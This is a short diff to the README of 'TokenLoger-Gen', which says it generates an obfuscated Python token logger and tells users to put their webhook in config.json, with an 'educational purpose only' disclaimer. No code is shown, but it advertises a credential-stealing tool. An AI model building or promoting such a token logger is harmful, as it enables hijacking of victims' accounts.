@@ -1,5 +1,7 @@
 # TokenLoger-Gen
-This will generate an obfuscated python token loger
+This will generate an obfuscated python token loger.
+
+just put your webhook inside the config.json file
 
 # Legality
 Educational purpose only.
